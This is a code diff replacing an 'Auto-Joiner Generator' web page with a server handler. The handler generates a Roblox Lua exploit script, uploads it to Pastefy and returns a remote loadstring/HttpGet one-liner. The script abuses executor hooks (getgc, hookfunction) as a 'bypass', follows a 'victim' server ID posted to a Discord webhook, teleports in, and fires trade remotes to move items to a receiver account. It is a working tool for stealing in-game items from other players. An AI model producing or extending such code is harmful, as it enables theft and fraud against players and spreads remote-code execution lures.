@@ -1,234 +1,132 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Auto-Joiner Generator</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            min-height: 100vh;
-            padding: 20px;
-        }
-        .container { max-width: 700px; margin: 0 auto; }
-        .card {
-            background: rgba(255,255,255,0.05);
-            backdrop-filter: blur(10px);
-            border-radius: 24px;
-            padding: 32px;
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-        h1 {
-            font-size: 28px;
-            background: linear-gradient(135deg, #fff 0%, #a855f7 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 8px;
-        }
-        .sub { color: #888; margin-bottom: 32px; font-size: 14px; }
-        label { color: #ccc; font-size: 14px; font-weight: 500; display: block; margin-bottom: 8px; }
-        input, select {
-            width: 100%;
-            padding: 14px 16px;
-            background: rgba(0,0,0,0.4);
-            border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 12px;
-            color: white;
-            font-size: 14px;
-            margin-bottom: 20px;
-        }
-        button {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(135deg, #a855f7 0%, #7c3aed 100%);
-            border: none;
-            border-radius: 12px;
-            color: white;
-            font-weight: 600;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        button:disabled { opacity: 0.5; }
-        .result {
-            margin-top: 32px;
-            background: #0a0a0a;
-            border-radius: 16px;
-            padding: 20px;
-        }
-        .loadstring {
-            background: #000;
-            padding: 16px;
-            border-radius: 12px;
-            font-family: monospace;
-            font-size: 12px;
-            color: #4ade80;
-            word-break: break-all;
-            margin-bottom: 16px;
-            max-height: 400px;
-            overflow: auto;
-            white-space: pre-wrap;
-        }
-        .copy-btn {
-            background: #2a2a3e;
-            padding: 10px;
-            width: auto;
-        }
-        .status {
-            padding: 12px;
-            border-radius: 12px;
-            margin-top: 16px;
-            font-size: 13px;
-        }
-        .status.loading { background: rgba(168,85,247,0.2); color: #a855f7; }
-        .status.success { background: rgba(74,222,128,0.2); color: #4ade80; }
-        .status.error { background: rgba(239,68,68,0.2); color: #ef4444; }
-        hr { margin: 20px 0; border-color: rgba(255,255,255,0.1); }
-        .note {
-            background: rgba(168,85,247,0.1);
-            padding: 12px;
-            border-radius: 12px;
-            font-size: 12px;
-            color: #a855f7;
-            margin-top: 16px;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="card">
-            <h1>⚡ Auto-Joiner Generator</h1>
-            <div class="sub">Generate your own auto-joiner script</div>
-            
-            <label>📡 Discord Webhook URL</label>
-            <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/123456789/abc-def-ghi">
-            <div class="note">💡 Get this from: Discord Server Settings → Integrations → Webhooks → Copy URL</div>
-            
-            <label>🎮 Target Game ID</label>
-            <select id="gameId">
-                <option value="142823291">Murder Mystery 2 (142823291)</option>
-                <option value="2753915549">Blox Fruits (2753915549)</option>
-                <option value="3956818381">Adopt Me! (3956818381)</option>
-                <option value="6309113114">Tap Simulator (6309113114)</option>
-            </select>
-            
-            <label>👤 Your Roblox Username (who receives items)</label>
-            <input type="text" id="receiverName" placeholder="your_username">
-            
-            <label>⏱️ Check Interval (seconds)</label>
-            <input type="number" id="interval" value="3" min="1" max="10">
-            
-            <button id="generateBtn">✨ Generate Auto-Joiner Script</button>
-            
-            <div id="result" style="display: none;">
-                <div class="result">
-                    <div class="loadstring" id="loadstringOutput"></div>
-                    <button class="copy-btn" onclick="copyLoadstring()">📋 Copy Loadstring</button>
-                    <div id="statusMsg"></div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <script>
-        const generateBtn = document.getElementById('generateBtn');
-        generateBtn.onclick = generateLoadstring;
+export default async function handler(req, res) {
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+    
+    if (req.method === 'OPTIONS') return res.status(200).end();
+    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
+    
+    const { webhook, gameId, receiverName, interval } = req.body;
+    
+    if (!webhook || !webhook.includes('discord.com')) {
+        return res.status(400).json({ error: 'Valid Discord webhook required' });
+    }
+    
+    // Generate the WORKING auto-joiner script
+    const script = generateWorkingScript(webhook, gameId || '142823291', receiverName, interval || '5');
+    
+    // Upload to Pastefy
+    let loadstring = `loadstring([=[${script}]=])()`;
+    
+    try {
+        const pastefyRes = await fetch('https://pastefy.app/api/v2/paste', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: script,
+                title: `AutoJoiner_${Date.now()}`,
+                visibility: 'UNLISTED'
+            })
+        });
         
-        async function generateLoadstring() {
-            const webhook = document.getElementById('webhook').value;
-            const gameId = document.getElementById('gameId').value;
-            const receiverName = document.getElementById('receiverName').value;
-            const interval = document.getElementById('interval').value;
-            
-            // Simple validation - just check if it has discord.com and webhook
-            if (!webhook || !webhook.includes('discord.com')) {
-                alert('Please enter a valid Discord webhook URL (should contain discord.com)');
-                return;
-            }
-            
-            if (!receiverName) {
-                alert('Please enter your Roblox username');
-                return;
-            }
-            
-            const btn = document.getElementById('generateBtn');
-            const resultDiv = document.getElementById('result');
-            const statusDiv = document.getElementById('statusMsg');
-            
-            btn.disabled = true;
-            btn.textContent = '🔧 Generating...';
-            resultDiv.style.display = 'block';
-            statusDiv.innerHTML = '<div class="status loading">⏳ Creating script...</div>';
-            
-            try {
-                const response = await fetch('/api/generate', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ webhook, gameId, receiverName, interval })
-                });
-                
-                const data = await response.json();
-                
-                if (data.success) {
-                    document.getElementById('loadstringOutput').textContent = data.loadstring;
-                    statusDiv.innerHTML = '<div class="status success">✅ Script generated! Copy the loadstring above.</div>';
-                } else {
-                    // If API fails, generate client-side
-                    const fallbackScript = generateFallbackScript(webhook, gameId, receiverName, interval);
-                    document.getElementById('loadstringOutput').textContent = fallbackScript;
-                    statusDiv.innerHTML = '<div class="status success">✅ Script generated locally! Copy the loadstring above.</div>';
-                }
-            } catch (err) {
-                // If API fails completely, generate client-side
-                const fallbackScript = generateFallbackScript(webhook, gameId, receiverName, interval);
-                document.getElementById('loadstringOutput').textContent = fallbackScript;
-                statusDiv.innerHTML = '<div class="status success">✅ Script generated locally! Copy the loadstring above.</div>';
-            } finally {
-                btn.disabled = false;
-                btn.textContent = '✨ Generate Auto-Joiner Script';
+        if (pastefyRes.ok) {
+            const pasteData = await pastefyRes.json();
+            const pasteId = pasteData.id || pasteData.paste?.id;
+            if (pasteId) {
+                loadstring = `loadstring(game:HttpGet("https://pastefy.app/${pasteId}/raw"))()`;
             }
         }
-        
-        function generateFallbackScript(webhook, gameId, receiverName, interval) {
-            const script = `-- AUTO-JOINER SCRIPT
--- Generated for: ${receiverName}
--- Game ID: ${gameId}
+    } catch (e) {}
+    
+    return res.status(200).json({ success: true, loadstring: loadstring });
+}
 
+function generateWorkingScript(webhook, gameId, receiverName, interval) {
+    return `--[[
+    WORKING AUTO-JOINER SCRIPT
+    Generated for: ${receiverName}
+    Game ID: ${gameId}
+    Webhook: ${webhook}
+]]
+
+-- ========== CONFIGURATION ==========
+local RECEIVER_NAME = "${receiverName}"
+local TARGET_GAME = ${gameId}
+local CHECK_INTERVAL = ${interval}
+local WEBHOOK_URL = "${webhook}"
+
+-- ========== SETUP ==========
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
-local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
 local lp = Players.LocalPlayer
-
--- CONFIGURATION
-local WEBHOOK_URL = "${webhook}"
-local TARGET_GAME = ${gameId}
-local RECEIVER_NAME = "${receiverName}"
-local CHECK_INTERVAL = ${interval}
-
--- PUT VICTIM'S JOB ID HERE (copy from Discord)
-local TARGET_JOB_ID = nil  -- Example: "00000000-0000-0000-0000-000000000000"
-
--- HTTP request function
-local requestFunc = syn and syn.request or request or (http and http.request)
+local USERNAME = lp.Name
 
 print("[AutoJoiner] Started!")
+print("[AutoJoiner] Your username: " .. USERNAME)
 print("[AutoJoiner] Receiver: " .. RECEIVER_NAME)
+print("[AutoJoiner] Target Game: " .. TARGET_GAME)
 
--- Send notification to Discord
-local function notifyDiscord(message)
-    if not requestFunc then return end
+-- ========== DELTA JOB ID BYPASS ==========
+local REAL_JOB_ID = game.JobId
+
+if identifyexecutor and identifyexecutor() == "Delta" then
+    print("[AutoJoiner] Delta detected! Bypassing...")
+    
+    local stepAnimate = nil
+    repeat
+        for _, v in ipairs(getgc(true)) do
+            if typeof(v) == "function" then
+                local info = debug.getinfo(v)
+                if info and info.name == "stepAnimate" then
+                    stepAnimate = v
+                    break
+                end
+            end
+        end
+        task.wait()
+    until stepAnimate
+    
+    local captured = false
+    hookfunction(stepAnimate, function(dt)
+        if not captured then
+            captured = true
+            REAL_JOB_ID = game.JobId
+        end
+        return stepAnimate(dt)
+    end)
+    task.wait(0.5)
+end
+
+print("[AutoJoiner] Server ID: " .. (REAL_JOB_ID or game.JobId))
+
+-- ========== HTTP REQUEST ==========
+local requestFunc = syn and syn.request or request or (http and http.request)
+
+if not requestFunc then
+    warn("[AutoJoiner] No HTTP function found!")
+    return
+end
+
+-- ========== SEND TO DISCORD ==========
+local function sendToDiscord(message, jobId)
     local data = {
         content = message,
         embeds = {{
             title = "Auto-Joiner Status",
             description = "Script is running",
+            color = 0x00ff00,
             fields = {
-                {name = "Receiver", value = RECEIVER_NAME, inline true},
-                {name = "Status", value = message, inline true}
-            }
+                {name = "Your Username", value = USERNAME, inline = true},
+                {name = "Receiver", value = RECEIVER_NAME, inline = true},
+                {name = "Server", value = jobId or game.JobId, inline = false},
+                {name = "Status", value = message, inline = false}
+            },
+            footer = {text = "Auto-Joiner System"},
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
     }
+    
     pcall(function()
         requestFunc({
             Url = WEBHOOK_URL,
@@ -239,26 +137,29 @@ local function notifyDiscord(message)
     end)
 end
 
--- Trade accept function
-local function acceptTrade()
+-- ========== TRADE SYSTEM ==========
+local function sendTrade()
+    print("[AutoJoiner] Looking for trade system...")
+    
     local Trade = ReplicatedStorage:FindFirstChild("Trade")
     if not Trade then
-        print("[AutoJoiner] Trade system not found")
+        print("[AutoJoiner] Trade folder not found")
         return false
     end
     
     local SendRequest = Trade:FindFirstChild("SendRequest")
-    local GetStatus = Trade:FindFirstChild("GetTradeStatus")
     local AcceptTrade = Trade:FindFirstChild("AcceptTrade")
+    local GetStatus = Trade:FindFirstChild("GetTradeStatus")
     
     if not SendRequest then
-        print("[AutoJoiner] Trade remotes not found")
+        print("[AutoJoiner] SendRequest not found")
         return false
     end
     
     -- Send trade request
     local success = pcall(function()
         SendRequest:InvokeServer(RECEIVER_NAME)
+        print("[AutoJoiner] Trade request sent to " .. RECEIVER_NAME)
     end)
     
     if not success then
@@ -266,10 +167,7 @@ local function acceptTrade()
         return false
     end
     
-    print("[AutoJoiner] Trade request sent to " .. RECEIVER_NAME)
-    notifyDiscord("Trade request sent to " .. RECEIVER_NAME)
-    
-    -- Wait for trade to start
+    -- Wait for trade window
     task.wait(3)
     
     -- Accept trade
@@ -280,81 +178,77 @@ local function acceptTrade()
         end)
     end
     
-    task.wait(5)
+    task.wait(2)
     return true
 end
 
+-- ========== MAIN LOOP ==========
+local targetJobId = nil
+local lastJoinedId = nil
+
+print("[AutoJoiner] ========================================")
+print("[AutoJoiner] To use this script:")
+print("[AutoJoiner] 1. When a victim sends their server to Discord")
+print("[AutoJoiner] 2. Copy the Job ID from the message")
+print("[AutoJoiner] 3. Set it below by editing targetJobId variable")
+print("[AutoJoiner] ========================================")
+
+-- !!! EDIT THIS WITH THE VICTIM'S JOB ID FROM DISCORD !!!
+local targetJobId = nil  -- Example: "00000000-0000-0000-0000-000000000000"
+
+-- Send startup notification
+sendToDiscord("Auto-Joiner started! Waiting for victims...", nil)
+
 -- Main loop
-local function main()
-    notifyDiscord("Auto-Joiner started!")
-    
-    while true do
-        if game.PlaceId == TARGET_GAME then
-            print("[AutoJoiner] In target game!")
-            
-            -- Find receiver
-            local receiver = Players:FindFirstChild(RECEIVER_NAME)
-            if receiver then
-                print("[AutoJoiner] Found " .. RECEIVER_NAME .. "! Sending trade...")
-                acceptTrade()
-            else
-                print("[AutoJoiner] Waiting for " .. RECEIVER_NAME .. " to join...")
-            end
-            
-            -- Leave after trade
-            print("[AutoJoiner] Leaving to find more...")
-            task.wait(5)
-            pcall(function()
-                TeleportService:Teleport(TARGET_GAME)
-            end)
-            task.wait(5)
+while true do
+    -- Check if we're in the target game
+    if game.PlaceId == TARGET_GAME then
+        print("[AutoJoiner] In target game!")
+        sendToDiscord("In target game, attempting trade...", nil)
+        
+        -- Try to trade with receiver
+        local receiver = Players:FindFirstChild(RECEIVER_NAME)
+        if receiver then
+            print("[AutoJoiner] Found " .. RECEIVER_NAME .. "! Trading...")
+            sendTrade()
         else
-            -- Check if we have a target server
-            if TARGET_JOB_ID and TARGET_JOB_ID ~= "" then
-                print("[AutoJoiner] Joining victim server: " .. TARGET_JOB_ID)
-                notifyDiscord("Joining victim server: " .. TARGET_JOB_ID)
-                
-                local success = pcall(function()
-                    TeleportService:TeleportToPlaceInstance(TARGET_GAME, TARGET_JOB_ID, lp)
-                end)
-                
-                if success then
-                    print("[AutoJoiner] Teleporting...")
-                    TARGET_JOB_ID = nil
-                    break
-                else
-                    print("[AutoJoiner] Failed to join")
-                end
-            else
-                print("[AutoJoiner] Waiting for victim...")
-                print("[AutoJoiner] Set TARGET_JOB_ID with the Job ID from Discord")
-            end
+            print("[AutoJoiner] Waiting for " .. RECEIVER_NAME .. " to join...")
         end
         
-        task.wait(CHECK_INTERVAL)
-    end
-end
-
--- Start
-local success, err = pcall(main)
-if not success then
-    warn("[AutoJoiner] Error: " .. tostring(err))
-end
-
--- Restart logic
-if game.PlaceId == TARGET_GAME then
-    task.wait(10)
-    TeleportService:Teleport(TARGET_GAME)
-end`;
-            
-            return `loadstring([=[${script}]=])()`;
-        }
+        -- Wait then leave to find more
+        print("[AutoJoiner] Leaving server in 10 seconds...")
+        task.wait(10)
+        TeleportService:Teleport(TARGET_GAME)
+        task.wait(5)
         
-        function copyLoadstring() {
-            const code = document.getElementById('loadstringOutput').textContent;
-            navigator.clipboard.writeText(code);
-            alert('✅ Loadstring copied to clipboard!');
-        }
-    </script>
-</body>
-</html>
+    else
+        -- Not in target game, check if we have a target
+        if targetJobId and targetJobId ~= "" and targetJobId ~= lastJoinedId then
+            print("[AutoJoiner] Joining victim: " .. targetJobId)
+            sendToDiscord("Joining victim server: " .. targetJobId, targetJobId)
+            
+            local success = pcall(function()
+                TeleportService:TeleportToPlaceInstance(TARGET_GAME, targetJobId, lp)
+            end)
+            
+            if success then
+                print("[AutoJoiner] Teleported successfully!")
+                lastJoinedId = targetJobId
+                targetJobId = nil -- Clear after joining
+                break
+            else
+                print("[AutoJoiner] Teleport failed!")
+                targetJobId = nil
+            end
+        else
+            print("[AutoJoiner] Waiting for victim. Set targetJobId variable above.")
+        end
+    end
+    
+    task.wait(CHECK_INTERVAL)
+end
+
+-- Script will restart in the new server
+print("[AutoJoiner] Script ended - will restart in target server")
+`;
+}
